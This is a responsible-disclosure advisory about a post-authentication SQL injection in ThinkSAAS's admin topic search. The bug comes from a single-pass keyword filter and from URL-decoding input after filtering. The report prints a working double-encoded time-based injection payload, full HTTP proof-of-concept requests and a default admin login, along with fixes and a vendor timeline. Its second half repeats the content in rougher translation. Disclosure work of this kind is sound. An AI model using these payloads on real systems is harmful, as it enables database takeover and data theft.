---
title: "Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php#2 (bypass of CVE-2020-35337)"
slug: xbr4xw
translationKey: xbr4xw
date: 2021-07-30T23:28:07+08:00
source: yuque/penetration
---

**Vulnerability name:** ThinkSAAS latest version app/topic/action/admin/topic.php contains a SQL injection vulnerability (administrator privileges required)

**Author:** Author of the vuln: Qianxin, Network Security Department, Product-Safety Team ( Unc1e )

This document provides responsible disclosure, aiming to give the open-source code vendor details of the security vulnerability and to facilitate a fix before the vulnerability is exploited in the wild.

# 0x01 Background
Last December, there was a security issue caused by improper URLDecode. See [https://github.com/thinksaas/ThinkSAAS/issues/24](https://github.com/thinksaas/ThinkSAAS/issues/24)

To summarize: in `ThinkSAAS-master\app\topic\action\admin\topic.php`, improper filtering of the keyword parameter led to SQL injection.

In last year's fix (click [here](https://github.com/thinksaas/ThinkSAAS/commit/771ade71e29d85fbeed06a97b5efde2690bf0bc8#diff-96592e102fa5e61c02150b963d7e30f03b7a5270be074b22091c1aca4bb321fb) to go directly), the `$title` variable was first replaced with `$kw`,

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659360851-7a2f4613-4d14-4e50-b8f2-4a80553898ba.png)

and it was then filtered through the `tsFilter` function.

But this still carries a security risk

# 0x02 Vulnerability Analysis
**Global filtering analysis**

In ThinkSAAS-master\thinksaas\thinksaas.php#62, filtering is done with `tsgpc`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627663829766-a96c94c9-22ec-4cc0-a9dc-28bcf896db97.png)

This is meant to prevent SQL injection

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627663858126-47c04960-1fac-475c-b66a-e90c628e2fe3.png)

## (1) Improper filtering logic in the `tsFilter` function
The `tsFilter` function is located in `ThinkSAAS-master\thinksaas\tsFunction.php` (click [here](https://github.com/thinksaas/ThinkSAAS/blob/eaa963e663b992196acd9d0ef8cb45b7f66d9418/thinksaas/tsFunction.php#L2242) to go directly)

This function replaces certain dangerous keywords with nothing, but it makes a mistake here: it replaces only once, which allows an attacker to use the double-write technique to construct a keyword like

```php
SELselect ECT 
```

to smuggle out a real `SELECT`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659592602-9623c52a-9793-4a5e-863f-9e6daa462ae6.png)

Therefore, it is recommended to change the `if` that **replaces only once** into a `while` that **replaces in a loop**

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659752682-96b90f17-1471-4b3f-b526-fc0155584a47.png)

## (2) Improper filtering order
Note: the problem in (1) above is not the main one — even without problem (1), we could still carry out the SQL injection attack.

The logic implemented in `app/topic/action/admin/topic.php` (click [here](https://github.com/thinksaas/ThinkSAAS/blob/771ade71e29d85fbeed06a97b5efde2690bf0bc8/app/topic/action/admin/topic.php#L13) to go directly) takes the user-input variable `$_GET['kw']`, filters it first, and then decodes it with the URLDecode function, which creates the SQL injection vulnerability.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627660025557-27b06121-55ed-4017-9ca9-af6d5eebd485.png)

Simply put, the problem is that **the value being filtered** differs from **the value that is finally concatenated and passed into the database query**.

The steps are as follows:

```sql
1, User-input param: %2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520

 
2, the $kw param the server received (the server auto URL-decodes once): %50%6f%43%27%20%61%6e%64%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%73%6c%65%65%70%28%31%29%29%78%29%20%2d%2d%20
  - first goes through tsgpc() in thinksaas/thinksaas.php#62
  - tsgpc() is essentially a wrapper around addslashes() to escape quotes [there are no single quotes at all at this point]
  - then goes to tsFilter() on line 13 above to filter blacklisted keywords [likewise, it performs no operation]
	- the parameter is unchanged
  
3, $kw=urldecode(tsFilter($_GET['kw'])); 
at this point the $kw parameter is URL-decoded once more, restoring its "true face":
PoC' and (select 1 from (select sleep(1))x) -- 
  
4, the statement finally passed into the database query (causing SQL injection):
SELECT * FROM ts_topic WHERE `title` like '%PoC' and (select 1 from (select sleep(1))x) -- %' ORDER BY addtime desc
```

Or, if this is still unclear, you can add "print the SQL statement" debug code at `thinksaas\tsApp.php#165`, as shown in the figure below:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627661422093-684f8c59-66cf-4313-8f54-2eb4603bf14d.png)

```sql
GET /index.php?app=topic&ac=admin&mg=topic&ts=list&kw=%2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520 HTTP/1.1
Host: thinksaas
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://thinksaas/index.php?install=result
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=t86vbus6e31om7uv1mrskb3ea5; Hm_lvt_5964cd4b8810fcc73c98618d475213f6=1627657957; Hm_lpvt_5964cd4b8810fcc73c98618d475213f6=1627657957
Connection: close


```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627661966854-41a1c6bb-2a56-4765-81f4-711aa0bea81f.png)

# 0x03 Vulnerability Verification
First, visit the "system administration login" page and enter the account and password to log in to the backend.

```sql
http://thinksaas/index.php?app=user&ac=system
- the default account and password are
- admin@admin.com / 123456
```

Next, visit the URL

```sql
http://thinksaas//index.php?app=topic&ac=admin&mg=topic&ts=list&kw=%2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520
```

You can observe a 2-second delay on the page — this is the proof of concept (PoC) for the vulnerability.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627662223414-31164b03-4867-4608-8865-ecb0f45cd163.png)

When actually exploiting this vulnerability, an attacker can use logical operations and similar means to gain full control of the database, performing dangerous operations such as querying information from the database and writing a webshell.



# 0x04 Remediation
## (1) Improve the `tsFilter` function
The `tsFilter` function is located in `ThinkSAAS-master\thinksaas\tsFunction.php` (click [here](https://github.com/thinksaas/ThinkSAAS/blob/eaa963e663b992196acd9d0ef8cb45b7f66d9418/thinksaas/tsFunction.php#L2242) to go directly)

Although a blacklist approach is not recommended for preventing SQL injection... as a fix, the `if` in the tsFunction function that **replaces only once** can be changed into a `while` that **replaces in a loop**

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659752682-96b90f17-1471-4b3f-b526-fc0155584a47.png)

## (2) Fix the logic in topic.php
It is best to remove `urldecode` and filter directly.

With a [decode first, then filter] approach, the risk remains, because URLDecode decoding lets attackers bypass the global `tsgpc()` function; only using the addslashes function correctly can truly prevent SQL injection.

Change the logic implemented in `app/topic/action/admin/topic.php` (click [here](https://github.com/thinksaas/ThinkSAAS/blob/771ade71e29d85fbeed06a97b5efde2690bf0bc8/app/topic/action/admin/topic.php#L13) to go directly) to

```sql
$kw=tsFilter($_GET['kw']);  //recommended
```



# CVE request info
## 0x01 Summay
In last December last year, there were security problems caused by improper URLDecode. Reference[https://github.com/thinksaas/ThinkSAAS/issues/24](https://github.com/thinksaas/ThinkSAAS/issues/24)

To sum up, it is in`ThinkSAAS-master\app\topic\action\admin\topic.php`, improper filtering of keyword parameters leads to SQL injection.

In last year's fix plan (click[Here](https://github.com/thinksaas/ThinkSAAS/commit/771ade71e29d85fbeed06a97b5efde2690bf0bc8#diff-96592e102fa5e61c02150b963d7e30f03b7a5270be074b22091c1aca4bb321fb)Direct), the first is`$title`Changed`$kw`Variable,

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659360851-7a2f4613-4d14-4e50-b8f2-4a80553898ba.png)

And, after`tsFilter`Function filtering.

However, there are still security risks now.

```basic
# Responsible Vulnerability Disclosure info

Title: 
	ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php

Desc:
  ThinkSAAS before 3.52 has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter(need the privilege of admin), allowing logged attackers to execute arbitrary SQL commands.	This is a bypass of CVE-2020-35337. 

CVSS v3.1 Vector: 
- 7.5
AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:H/MPR:H/MUI:N/MS:C/MC:H/MI:H/MA:H

Result:
	The vendor has confirmed this vuln and updated [ThinkSAAS 3.53] to fix this vuln.




Reference:
- https://github.com/thinksaas/ThinkSAAS/issues/28
```





## 0x02 security vulnerability analysis
**Global filtering analysis**

In `ThinkSAAS-master\thinksaas\thinksaas.php#62`, use`tsgpc`Filter

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627663829766-a96c94c9-22ec-4cc0-a9dc-28bcf896db97.png)

Using `addslashes ` to prevent SQL injection

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627663858126-47c04960-1fac-475c-b66a-e90c628e2fe3.png)

### (1)`tsFilter`Improper function filtering logic
`tsFilter`Function`ThinkSAAS-master\thinksaas\tsFunction.php`In (click[Here](https://github.com/thinksaas/ThinkSAAS/blob/eaa963e663b992196acd9d0ef8cb45b7f66d9418/thinksaas/tsFunction.php#L2242)Direct)

This function replaces some of the dangerous keywords with null, but an error is made here: it is replaced only once, causing attackers to use the double-write method to construct

```php
SELselect ECT 
```

To escape from the real`SELECT`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659592602-9623c52a-9793-4a5e-863f-9e6daa462ae6.png)

Therefore, we recommend that you**Replace only once**The`If`, change to meeting**Loop replacement**The`While`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659752682-96b90f17-1471-4b3f-b526-fc0155584a47.png)

### (2) improper filtering order
Please note: The problem in (1) just now is not the most important-even if there is no problem in (1), we can also carry out SQL injection attacks.

In`app/topic/action/admin/topic.php`In the implementation of the logic (click[Here](https://github.com/thinksaas/ThinkSAAS/blob/771ade71e29d85fbeed06a97b5efde2690bf0bc8/app/topic/action/admin/topic.php#L13)Direct), is the user input variable`$_get ['kw']`The SQL injection vulnerability is caused by filtering and then using URLDecode function decoding.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627660025557-27b06121-55ed-4017-9ca9-af6d5eebd485.png)

In short, it is**The value of the filter.**With**Finally concatenate and substitute the values of the Query Database**Problems caused by differences.

The procedure is as follows:

```sql
1, User-input param: %2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520

 
2, the $kw param Server received(has been auto UrlDecoded for once): %50%6f%43%27%20%61%6e%64%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%73%6c%65%65%70%28%31%29%29%78%29%20%2d%2d%20
  - goto thinksaas/thinksaas.php#62 via tsgpc()
  - tsgpc() actually do addslashes() to escape [',"][there is no [',"], you konw]
  - then via the line 13 tsFilter() to filter black-word[actually do no operation]
	- param no change
  
3, $kw=urldecode(tsFilter($_GET['kw']));  
 notice the $kw param has been UrlDecoded agained (for twice, you know):
PoC' and (select 1 from (select sleep(1))x) -- 
  
4,So the impace is: Post-Auth SQL-injection:
SELECT * FROM ts_topic WHERE `title` like '%PoC' and (select 1 from (select sleep(1))x) -- %' ORDER BY addtime desc
```

Or if you still feel unclear, you can`thinksaas\tsApp.php#165`Add the debugging code of "print SQL statement", as shown in the following figure:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627661422093-684f8c59-66cf-4313-8f54-2eb4603bf14d.png)

```sql
GET /index.php?app=topic&ac=admin&mg=topic&ts=list&kw=%2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520 HTTP/1.1
Host: thinksaas
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://thinksaas/index.php?install=result
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=t86vbus6e31om7uv1mrskb3ea5; Hm_lvt_5964cd4b8810fcc73c98618d475213f6=1627657957; Hm_lpvt_5964cd4b8810fcc73c98618d475213f6=1627657957
Connection: close


```

Causing a delay of 2 seconds

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627661966854-41a1c6bb-2a56-4765-81f4-711aa0bea81f.png)

## 0x03 vulnerability verification(PoC & EXPLOIT)
```http
GET /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC%%2527+and/**/1-(select/**/1/**/from/**/(select+sleep(3))a)%2523%2520 HTTP/1.1
Host: thinksaas
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4230.1 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://thinksaas/index.php?app=search&ac=s&kw=keyword
Cookie: PHPSESSID=6im4ssqo33h8l2d43u78nbr4c3;  ts_autologin=goh59atl3dsk44o4sws48s80co44ww8
Upgrade-Insecure-Requests: 1


```

# 
First, access the system management login interface, enter the account and password to log on to the background.

```sql
http://thinksaas/index.php?app=user&ac=system
- Default password is:
- admin@admin.com / 123456
```

Next, visit the URL

```sql
http://thinksaas//index.php?app=topic&ac=admin&mg=topic&ts=list&kw=%2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520
```

A 2-second latency is observed on the web page, which is the proof of concept (PoC) of the vulnerability.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627662223414-31164b03-4867-4608-8865-ecb0f45cd163.png)

When exploiting this vulnerability, attackers can use logical operations to fully control the database, query information in the database, write data to webshell, and other dangerous operations.



## 0x04 vulnerability fix
### (1) optimization`tsFilter`Function
`tsFilter`Function`ThinkSAAS-master\thinksaas\tsFunction.php`In (click[Here](https://github.com/thinksaas/ThinkSAAS/blob/eaa963e663b992196acd9d0ef8cb45b7f66d9418/thinksaas/tsFunction.php#L2242)Direct)

We recommend that you do not use a blacklist to prevent SQL injection. However, if the solution is fixed, you can tsFunction the function**Replace only once**The`If`, change to meeting**Loop replacement**The`While`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659752682-96b90f17-1471-4b3f-b526-fc0155584a47.png)

### (2) fixed the logic in topic.php.
Best remove`urldecode`, filter directly.

If [decode first, then filter], there is still a risk, because the URLDecode decode, so that attackers can bypass the global`tsgpc()`To prevent SQL injection, use the addslashes function correctly.

Will`app/topic/action/admin/topic.php`In the implementation of the logic (click[Here](https://github.com/thinksaas/ThinkSAAS/blob/771ade71e29d85fbeed06a97b5efde2690bf0bc8/app/topic/action/admin/topic.php#L13)Direct), changed

```sql
$kw=tsFilter($_GET['kw']);  //recommended
```



## 0x05 Time Line
+ 2021.07.31 08:40, Qianxin, Network Security Department, Product-Safety Team ( Unc1e ) reported this issue to the developer of ThinkSAAS, via Wechat.
+ 2021.07.31 09:07, ThinkSAAS confirmed this vulnerability.
+ 2021.07.31 09:26,  Qianxin, Network Security Department, Product-Safety Team ( Unc1e ) reviewed the mitigation of this vuln. (See [https://github.com/thinksaas/ThinkSAAS/commit/07ad8499afebd452647e2a95996ff90496d98093#diff-96592e102fa5e61c02150b963d7e30f03b7a5270be074b22091c1aca4bb321fb](https://github.com/thinksaas/ThinkSAAS/commit/07ad8499afebd452647e2a95996ff90496d98093#diff-96592e102fa5e61c02150b963d7e30f03b7a5270be074b22091c1aca4bb321fb))
+ 2021.07.31 12:00,  ThinkSAAS updated ThinkSAAS 3.53 to fix this vuln.
